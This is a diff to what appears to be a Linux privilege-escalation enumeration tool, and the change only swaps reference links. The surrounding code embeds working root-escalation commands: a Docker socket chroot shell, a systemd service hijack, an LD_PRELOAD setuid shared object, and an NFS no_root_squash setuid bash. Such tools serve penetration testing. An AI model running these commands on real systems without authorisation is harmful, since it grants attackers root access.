@@ -633,11 +633,11 @@ def build_graph(f):
             g = nid[4:]
             n["desc"] = f"Your user is a member of the '{g}' group, which grants root-equivalent power on this box."
             n["abuse"] = DANGEROUS_GROUPS.get(g, "")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html"
+            n["ref"] = "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#groups"
         elif nid == "docksock":
             n["desc"] = "/var/run/docker.sock is writable — you can talk to the Docker daemon (runs as root) directly."
             n["abuse"] = "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/"
+            n["ref"] = "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#docker"
         elif nid.startswith("wr:"):
             path = nid[3:]
             if path in SENSITIVE_WRITABLE:
@@ -664,7 +664,7 @@ def build_graph(f):
             n["abuse"] = (f"# point ExecStart at your payload, then:\n"
                           f"systemctl daemon-reload\nsystemctl start {base}\n"
                           f"# runs as root now (and on next boot)")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+            n["ref"] = "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#systemd-timers"
         elif nid == "kernel":
             n["desc"] = f"Kernel {f.get('kernel','')} — potentially vulnerable to a public exploit."
             n["abuse"] = kernel_note(f.get("kernel", ""))
@@ -683,7 +683,7 @@ def build_graph(f):
                           "void _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}\nEOF\n"
                           "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\n"
                           "sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+            n["ref"] = "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd"
         elif nid.startswith("nfs:"):
             share = nid[4:]
             n["desc"] = f"{share} is NFS-exported with no_root_squash — files you create as root on a box you control stay root here."
@@ -691,7 +691,7 @@ def build_graph(f):
                           f"mkdir /mnt/x; mount -o rw <target-ip>:{share} /mnt/x\n"
                           f"cp /bin/bash /mnt/x/sh; chmod +s /mnt/x/sh\n"
                           f"# back on the target as your user:\n{share}/sh -p")
-            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html"
+            n["ref"] = "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#nfs-root-squashing"
         elif nid.startswith("path:"):
             d = nid[5:]
             n["desc"] = f"{d} is writable AND in PATH. If a root process (cron/service) calls a binary by relative name, yours runs instead."
